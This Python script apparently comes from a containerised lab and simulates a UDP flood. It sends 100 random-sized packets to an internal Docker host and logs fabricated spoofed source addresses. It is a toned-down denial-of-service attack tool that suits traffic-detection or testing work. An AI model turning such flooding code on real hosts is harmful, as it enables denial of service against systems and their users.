"""
Network-secured version of ddos/UdpFlood.py
Modified to simulate UDP flood behavior without scapy
(scapy requires root privileges and raw sockets)
"""

import socket
import random
import time

# SECURITY: Use internal Docker network address
target_ip = "consumer"
target_port = 12345
count = 100  # Reduced from 1000 for safety

print(f"[UDP Flood] Starting UDP flood simulation")
print(f"[UDP Flood] Target: {target_ip}:{target_port}")
print(f"[UDP Flood] Count: {count} packets")
print("[UDP Flood] Note: scapy not available - using standard UDP socket")

for i in range(count):
    payload_size = random.randint(128, 1024)
    payload = b"A" * payload_size

    spoofed_ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}"
    spoofed_ip += f".{random.randint(0, 255)}.{random.randint(1, 254)}"

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        src_port = random.randint(1024, 65535)
        # Note: Can't actually spoof source IP without raw sockets/root
        # But we simulate the pattern
        sock.sendto(payload, (target_ip, target_port))
        sock.close()
        print(f"[UDP Flood] Packet {i + 1}/{count} ({payload_size}B) from {spoofed_ip}")
    except Exception as e:
        print(f"[UDP Flood] Error: {type(e).__name__}")

    time.sleep(random.uniform(0.01, 0.05))

print("[UDP Flood] Burst complete")
time.sleep(30)
